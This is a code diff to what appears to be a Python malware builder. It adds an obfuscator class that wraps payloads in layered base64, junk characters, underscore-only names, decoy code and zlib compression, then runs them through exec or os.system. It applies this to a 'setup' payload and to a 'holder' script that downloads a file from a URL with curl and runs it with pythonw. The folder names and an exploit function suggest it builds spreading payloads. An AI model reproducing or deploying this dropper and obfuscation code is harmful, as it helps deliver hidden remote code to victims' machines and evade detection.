@@ -3,6 +3,116 @@ import random
 from colorama import Fore, Back
 import base64
 
+#OBFUSEX#
+import zlib
+#OBFUSEX#
+
+class obfusex:
+    ################
+    logo = f"""{Fore.BLUE}       _      __                
+      | |    / _|                    
+  ___ | |__ | |_ _   _ ___  _____  __
+ / _ \| '_ \|  _| | | / __|/ _ \ \/ /
+| (_) | |_) | | | |_| \__ \  __/>  < 
+ \___/|_.__/|_|  \__,_|___/\___/_/\_\\{Fore.RESET}
+    """
+    #################
+
+    OFFSET = 30
+    VARIABLE_NAME = '_' * 100
+
+    def randomst_ints(count):
+        result=""
+        ints="0123456789"
+        for x in range(count):
+            result += ints[random.randint(0, ints.__len__() - 1)]
+        return result
+
+    def addbuffer(st, buffer):
+        result = ""
+        for x in range(st.__len__()):
+            if random.randint(1, 100) % 2 == 0:
+                pass
+            else:
+                result += buffer 
+            result += st[x]
+        return result
+
+    def addbuffer_low(st, buffer):
+        result = ""
+        for x in range(st.__len__()):
+            if random.randint(1, 100) % 8 == 0:
+                pass
+            else:
+                result += buffer
+            result += st[x]
+        return result
+
+    def obfuscate(content):
+        print(f"{Fore.BLUE}[*]{Fore.RESET} Adding buffer")
+        print(f"{Fore.BLUE}[*]{Fore.RESET} Encoding payload + buffer")
+        b64_content = base64.b64encode(obfusex.addbuffer(obfusex.addbuffer(obfusex.addbuffer(content, "碼"), "國"), "大").encode()).decode()
+        index = 0
+        print(f"{Fore.BLUE}[*]{Fore.RESET} Generating variables\n")
+        code = f'{obfusex.VARIABLE_NAME} = ""; _______________________=b"\\xe7\\xa2\\xbc\\xe5\\x9c\\x8b\\xe5\\xa4\\xa7".decode(); ______________________=1; import base64 as ___________________________________________________________________; __________________________________________________________________ = ___________________________________________________________________.b64decode;'
+        print(f"{Fore.YELLOW}[BUFFER_LOW]{Fore.GREEN} ", end='', flush='true')
+
+        for _ in range(int(len(b64_content) / obfusex.OFFSET) + 1):
+            _str = ''
+            for char in b64_content[index:index + obfusex.OFFSET]:
+                byte = str(hex(ord(char)))[2:]
+                if len(byte) < 2:
+                    byte = '0' + byte
+                _str += '\\x' + str(byte)
+
+            _str = base64.b64encode(_str.encode())
+            _str = _str.decode()
+            _str = obfusex.addbuffer_low(str(_str), "碼")
+            print(".", end='', flush='true')
+            
+            code += f'{obfusex.VARIABLE_NAME} += (__________________________________________________________________("{_str}".replace(_______________________[______________________ - ______________________], "_________".replace("_", "")).encode() )).decode("unicode_escape");'
+            index += obfusex.OFFSET
+        print(f"{Fore.RESET}\n")
+        print(f"{Fore.BLUE}[*]{Fore.RESET} Fusing with main code")
+        decoy = obfusex.randomst_ints(4950)
+
+        viriung = f"""____________________________________________________________________=___________________________________________________________________=__________________________________________________________________=_________________________________________________________________=________________________________________________________________=_______________________________________________________________=______________________________________________________________=_____________________________________________________________=____________________________________________________________=___________________________________________________________=__________________________________________________________="??????A///>>>>::APP[+67*(55)]"
+if ________________________________________________________________==_______________________________________________________________:
+    _______________________________________________________________="{decoy}"
+    if ________________________________________________________________ != _______________________________________________________________: pass
+    else: ____(___).___"""
+        code += f'__________________________={obfusex.VARIABLE_NAME};_________________________=1; ________________________=b"\\xe7\\xa2\\xbc\\xe5\\x9c\\x8b\\xe5\\xa4\\xa7".decode();_____="\\x75\\x74\\x66\\x2d\\x38";__=""*1;______=__import__;_______=exec;________="\\x62\\x61\\x73\\x65\\x36\\x34";_____________=_____; _______(______(________).b64decode(__________________________.encode(_____________)).decode(_____________).replace(________________________[_________________________ - _________________________], __).replace(________________________[_________________________], __).replace(________________________[_________________________ + _________________________], __))'
+        
+        print(f"{Fore.BLUE}[*]{Fore.RESET} Planting Decoy\n")
+
+        code = viriung + "\n" + code
+        
+        print(f"{Fore.GREEN}[+] Stage 1 done!{Fore.RESET}\n")
+        
+        return code
+
+    def main(content, slogo=True):
+        if slogo:
+            print(obfusex.logo)
+
+        try:
+            file_content = content
+
+            obfuscated_content = obfusex.obfuscate(file_content)
+            compressed = zlib.compress(obfuscated_content.encode())
+
+            print(f"{Fore.BLUE}[*] Compressing Payload{Fore.RESET}")
+
+            compresed_payload = (f"import os as ______________;import sys as _______________; import zlib as _____; __________ = (_____.decompress({compressed}))\nwith open('_______.__', 'wb+') as __:\n __.write(__________);__.close()\n______________.system(_______________.executable + ' _______.__'); ______________.remove('_______.__')")
+
+            print(f"{Fore.GREEN}[+] Obfuscation done!{Fore.RESET}")
+
+            return compresed_payload
+
+        except Exception as ex:
+            print(ex)
+            exit()
+
 class powfuscate:
     class utils:
         def toHex(st):
@@ -42,7 +152,7 @@ class powfuscate:
 
 class payloads:
     def get_setup(url):
-        return """import codecs as ______________________________________________________________________________________________________________________________________
+        normal = """import codecs as ______________________________________________________________________________________________________________________________________
 from sys import executable as ___________________________________________________
 from urllib import request as _____________________________________________________
 from os import getenv, system, name, listdir
@@ -103,12 +213,23 @@ except:
     pass
 """
 
+        print(f"{Fore.GREEN}-------- obfuscating setup-script using obfusex --------{Fore.RESET}\n")
+        obfuscated = obfusex.main(normal, False)
+        print(f"\n{Fore.GREEN}--------  obfuscation (setup-script) finished   --------{Fore.RESET}\n")
+
+        return obfuscated
+
     def get_holder(url):
         rand = program.randomString(16)
         ex = program.randomExtension()
-        return f"""import os
+        normal = f"""import os
 os.system("curl {url} -o {rand}{ex} && pythonw {rand}{ex}")
 """
+        print(f"{Fore.GREEN}-------- obfuscating holder using obfusex --------{Fore.RESET}\n")
+        obfuscated = obfusex.main(normal, False)
+        print(f"\n{Fore.GREEN}--------  obfuscation (holder) finished   --------{Fore.RESET}\n")
+
+        return obfuscated
 
     def get_exploit(path):
         contents = ""
@@ -161,6 +282,10 @@ class program:
     def main(args):
         print(program.ascii_art())
 
+        print(f"{Fore.RED}[-] Removing old folders{Fore.RESET}\n")
+
+        os.system("rm -rf ./spread_*")
+
         exploit_path = "exploit_.py"
         public_addr  = ""
         private_addr = ""
@@ -190,7 +315,7 @@ class program:
 
         print(f"{Fore.BLUE}[*]{Fore.RESET} Generating payloads")
 
-        temporary_folder = program.randomString(16)
+        temporary_folder = "spread_" + program.randomString(16)
         exploit_name = program.randomString(16) + program.randomExtension()
         setup_name = program.randomString(16) + program.randomExtension()
         holder_name = program.randomString(16) + program.randomExtension()
